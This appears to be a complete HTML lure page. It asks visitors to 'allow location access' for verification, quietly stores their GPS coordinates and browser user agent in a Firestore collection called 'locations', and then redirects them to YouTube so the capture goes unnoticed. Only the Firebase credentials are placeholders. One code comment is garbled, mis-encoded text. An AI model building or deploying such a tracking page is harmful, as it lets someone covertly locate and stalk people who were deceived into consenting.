<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Allow Location</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
  </style>
  <!-- Firebase SDKs -->
  <script type="module">
    // Import Firebase modules
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-firestore.js";

    // Your Firebase config - ‡¶è‡¶ñ‡¶æ‡¶®‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ú‡ßá‡¶ï‡ßç‡¶ü ‡¶•‡ßá‡¶ï‡ßá ‡¶®‡¶ø‡ßü‡ßá ‡¶Ü‡¶∏‡¶¨‡ßá
    const firebaseConfig = {
      apiKey: "YOUR_API_KEY",
      authDomain: "YOUR_AUTH_DOMAIN",
      projectId: "YOUR_PROJECT_ID",
      storageBucket: "YOUR_STORAGE_BUCKET",
      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
      appId: "YOUR_APP_ID"
    };

    // Initialize Firebase app and Firestore
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Function to get geolocation
    async function getGeoCoords() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: "Not supported", longitude: "Not supported" });
        } else {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
            },
            error => {
              resolve({ latitude: "Permission denied", longitude: "Permission denied" });
            },
            { timeout: 10000 }
          );
        }
      });
    }

    // Function to send data to Firestore
    async function startTracking() {
      try {
        const gps = await getGeoCoords();

        // Prepare data object
        const data = {
          latitude: gps.latitude,
          longitude: gps.longitude,
          user_agent: navigator.userAgent,
          timestamp: serverTimestamp()
        };

        // Save to Firestore collection "locations"
        await addDoc(collection(db, "locations"), data);

      } catch (err) {
        console.error("Error saving location:", err);
      } finally {
        // Redirect to YouTube after
        window.location.href = "https://youtube.com";
      }
    }

    // Attach to window so can call from inline button onclick
    window.startTracking = startTracking;
  </script>
</head>
<body>
  <h2>üìç Please allow location access</h2>
  <p>This helps us verify your location.</p>
  <button onclick="startTracking()">Allow & Continue</button>
</body>
</html>
